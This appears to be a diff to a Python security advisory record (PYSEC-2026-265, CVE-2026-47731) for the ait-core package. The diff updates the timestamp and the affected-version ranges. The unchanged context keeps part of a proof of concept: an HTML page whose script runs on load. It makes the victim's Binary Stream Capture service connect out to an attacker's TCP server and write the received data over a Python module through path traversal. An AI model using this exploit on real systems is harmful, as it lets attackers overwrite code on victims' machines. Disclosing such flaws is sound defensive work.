@@ -1,6 +1,6 @@
 id: PYSEC-2026-265
 published: "2026-06-29T11:50:52.843259Z"
-modified: "2026-07-01T20:22:47.877906Z"
+modified: "2026-07-02T12:33:00Z"
 aliases:
 - CVE-2026-47731
 - GHSA-p462-prxw-mjx4
@@ -10,36 +10,18 @@ details: "## 1. Summary\n\nThe Binary Stream Capture (BSC) component exposes an 
   \   print(\"[*] Done.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### 4.3 `test1.html`\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <title>AIT-BSC Path Traversal PoC (Browser + TCP)</title>\n </head>\n<body>\n<script>\n(function () {\n  // AIT-BSC REST API on the victim\n  const BSC_URL      = \"http://127.0.0.1:8080\";\n  const HANDLER_NAME = \"traversal-tcp-from-browser\";\n\n  // Attacker TCP server (remote)\n  const ATTACKER_HOST = \"192.168.1.184\";  // change to real host/IP\n  const ATTACKER_PORT = 9001;                    // must match Python server\n\n  // Target file on the victim (outside /tmp)\n  const TARGET_DIR  = \"/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/\";\n  const TARGET_FILE = \"dmc.py\";\n\n  function startHandler() {\n    // Tell ait-bsc to:\n    //  - connect via TCP to ATTACKER_HOST:ATTACKER_PORT\n    //  - log to TARGET_DIR/TARGET_FILE (escape /tmp via 'path')\n    const params = new URLSearchParams();\n    params.set(\"loc\", ATTACKER_HOST);\n    params.set(\"port\", String(ATTACKER_PORT));\n    params.set(\"conn_type\", \"tcp\");\n    params.set(\"path\", TARGET_DIR);\n    params.set(\"file_name_pattern\", TARGET_FILE);\n\n    fetch(`${BSC_URL}/${HANDLER_NAME}/start`, {\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n      },\n      body: params.toString(),\n      mode: \"no-cors\"  // we don't care about reading the response\n    }).catch(() => {});\n  }\n\n  // On page load, just start the handler. The attacker TCP server\n  // will send the payload as soon as ait-bsc connects.\n  window.addEventListener(\"load\", startHandler);\n})();\n</script>\n</body>\n</html>\n```"
 affected:
 - package:
-    name: ait-core
     ecosystem: PyPI
+    name: ait-core
     purl: pkg:pypi/ait-core
   ranges:
   - type: ECOSYSTEM
     events:
-    - introduced: "0"
+    - introduced: '0'
     - fixed: 2.6.1
+    - introduced: 3.1.0
+    - fixed: 3.1.1
   versions:
-  - 1.0.0
-  - 1.1.0
-  - 1.2.0
-  - 1.3.0
-  - 1.4.0
-  - 2.0.0
-  - 2.0.1
-  - 2.0rc1.dev0
-  - 2.1.0
-  - 2.2.0
-  - 2.3.0
-  - 2.3.1
-  - 2.3.2
-  - 2.3.3
-  - 2.3.4
-  - 2.3.5
-  - 2.4.0
-  - 2.5.0
-  - 2.5.1
-  - 2.5.2
-  - 2.6.0
+  - 3.1.0
 references:
 - type: WEB
   url: https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4
